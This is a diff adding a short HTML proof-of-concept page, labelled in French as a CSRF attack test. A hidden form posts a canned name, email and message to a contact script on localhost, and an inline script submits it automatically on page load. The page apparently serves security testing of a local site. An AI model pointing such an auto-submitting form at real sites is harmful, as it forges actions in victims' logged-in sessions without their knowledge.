@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Test Attaquant CSRF</h1>
+    <form action="http://localhost/contact.php" method="POST">
+        <input type="hidden" name="name" value="Attaquant">
+        <input type="hidden" name="email" value="attaquant@example.com">
+        <input type="hidden" name="message" value="Message injecté via CSRF.">
+        <button type="submit">Soumettre</button>
+    </form>
+
+    <script>
+        // Soumettre automatiquement le formulaire
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
